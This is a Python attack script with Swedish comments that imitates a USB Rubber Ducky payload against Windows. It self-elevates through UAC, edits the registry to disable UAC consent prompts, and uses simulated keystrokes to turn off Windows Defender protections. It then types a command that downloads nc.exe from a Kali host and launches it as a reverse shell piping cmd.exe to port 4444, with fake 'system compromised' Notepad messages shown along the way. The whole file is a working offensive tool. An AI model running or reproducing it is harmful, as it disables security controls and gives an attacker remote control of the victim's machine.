import subprocess
import time
import winreg
import pyautogui
import ctypes
import sys
import os

pyautogui.FAILSAFE = True
pyautogui.PAUSE = 0.03

# ----------------------------------------------------------------------
# AUTO-ELEVATION: Se till att skriptet körs som Administratör
# ----------------------------------------------------------------------

def is_admin():
    """Kontrollerar om skriptet körs med administratörsrättigheter."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def run_as_admin():
    """Startar om skriptet med administratörsrättigheter via UAC."""
    if not is_admin():
        print("[!] Inte administratör – startar om med förhöjda rättigheter...")
        
        # Bygg ihop kommandot: python.exe + sökvägen till detta skript + argument
        script = os.path.abspath(sys.argv[0])
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        
        # ShellExecuteW med "runas" triggar UAC-prompten
        # Parametrar: hwnd, operation, file, parameters, directory, show
        ret = ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",          # <-- Detta triggar UAC ("Kör som administratör")
            sys.executable,   # Python-exe
            f'"{script}" {params}',
            None,
            1                 # SW_NORMAL
        )
        
        # Om användaren trycker "Nej" på UAC returnerar ShellExecuteW <= 32
        if ret <= 32:
            print("[!] Användaren nekade UAC-prompten eller fel uppstod.")
            print(f"[!] ShellExecuteW returnerade: {ret}")
            sys.exit(1)
        
        # Avsluta den icke-elevated processen – den nya tar över
        sys.exit(0)


# Kör denna direkt vid start
run_as_admin()


# ----------------------------------------------------------------------
# "Hacker show" – öppna Notepad, skriv skräckinjagande text, stäng
# ----------------------------------------------------------------------

def hack_show(title, lines, hold=1.5, type_speed=0.02):
    """Öppna Notepad, skriv ett meddelande, döda processen."""
    pyautogui.hotkey("win", "r")
    time.sleep(0.3)
    pyautogui.write("notepad", interval=0.01)
    pyautogui.press("enter")
    time.sleep(0.8)

    pyautogui.write(title, interval=type_speed)
    pyautogui.press("enter")
    pyautogui.press("enter")

    for line in lines:
        pyautogui.write(line, interval=type_speed)
        pyautogui.press("enter")

    time.sleep(hold)

    subprocess.run(
        ["taskkill", "/IM", "notepad.exe", "/F"],
        capture_output=True,
    )
    time.sleep(0.4)


# ----------------------------------------------------------------------
# Riktiga jobbet (UAC & Defender)
# ----------------------------------------------------------------------

def disable_uac():
    path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    try:
        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0,
                              winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0,
                              winreg.REG_DWORD, 0)
        print("UAC avstängt i registret.")
    except PermissionError:
        print("[!] Åtkomst nekad – kör som administratör!")


def disable_defender():
    pyautogui.hotkey("win", "r")
    time.sleep(0.3)
    pyautogui.write("windowsdefender://threat", interval=0.03)
    pyautogui.press("enter")
    time.sleep(2.5)

    pyautogui.press("tab")
    pyautogui.press("tab")
    pyautogui.press("tab")
    pyautogui.press("tab")
    pyautogui.press("enter")
    time.sleep(2.0)

    pyautogui.press("space")
    time.sleep(1.5)

    pyautogui.press("tab")
    time.sleep(1.5)
    pyautogui.press("tab")
    time.sleep(1.5)
    pyautogui.press("tab")
    time.sleep(1.5)
    pyautogui.press("space")
    time.sleep(1.5)

    pyautogui.press("tab")
    time.sleep(1.5)
    pyautogui.press("space")
    time.sleep(1.5)

    pyautogui.press("tab")
    time.sleep(1.5)
    pyautogui.press("tab")
    time.sleep(1.5)
    pyautogui.press("space")
    time.sleep(1.5)


# ----------------------------------------------------------------------
# Ducky Script Payload (simuleras via pyautogui)
# ----------------------------------------------------------------------

def deploy_payload(kali_ip, port=4444):
    """
    Simulerar Ducky Script från bilden för att ladda ner och köra nc.exe.
    """
    print(f"Förbereder att skicka payload till {kali_ip}:{port}...")

    pyautogui.hotkey("win", "r")
    time.sleep(0.5)
    pyautogui.write("cmd", interval=0.05)
    pyautogui.press("enter")
    time.sleep(1.5)

    cmd1 = f"cd / & mkdir win & cd win & echo (wget 'http://{kali_ip}/nc.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1"
    pyautogui.write(cmd1, interval=0.01)
    pyautogui.press("enter")

    time.sleep(3.0)

    cmd2 = f"START /MIN a.exe {kali_ip} {port} -e cmd.exe -d & exit"
    pyautogui.write(cmd2, interval=0.01)
    pyautogui.press("enter")

    print("Payload skickad! Kontrollera din Netcat-lyssnare i Kali.")


# ----------------------------------------------------------------------
# Start
# ----------------------------------------------------------------------

if __name__ == "__main__":

    KALI_IP = "192.168.56.101"
    PORT = 4444

    # ---- Show 1: Initiering ----
    hack_show(
        ">> SYSTEM BREACH INITIATED <<",
        [
            "",
            "[*] Connecting to target...",
            "[*] Target:  LOCALHOST",
            "[*] Bypassing firewall... OK",
            "[*] Establishing backdoor... OK",
            "",
            ">>> YOU HAVE BEEN HACKED <<<",
            "",
            "[*] Deploying payload...",
        ],
        hold=2.0,
    )

    print("Steg 1: Stänger av UAC...")
    disable_uac()
    time.sleep(2)

    # ---- Show 2: UAC nere ----
    hack_show(
        ">> UAC BYPASSED <<",
        [
            "",
            "[-] User Account Control ...... DISABLED",
            "[-] Security prompts .......... BYPASSED",
            "[-] Admin consent ............. GRANTED",
            "",
            ">>> ACCESS GRANTED <<<",
        ],
        hold=1.5,
    )

    print("Steg 2: Stänger av Windows Defender...")
    disable_defender()
    time.sleep(2)

    # ---- Show 3: Allt nere ----
    hack_show(
        ">> SYSTEM FULLY COMPROMISED <<",
        [
            "",
            "[-] Real-time protection ...... OFF",
            "[-] Cloud protection .......... OFF",
            "[-] Tamper protection ......... OFF",
            "[-] Firewall .................. BYPASSED",
            "",
            ">>> ALL YOUR FILES ARE BELONG TO US <<<",
            "",
            "        [ connection closed ]",
        ],
        hold=2.5,
    )

    print("Steg 3: Kör Ducky Script Payload...")
    deploy_payload(KALI_IP, PORT)

    print("Klart.")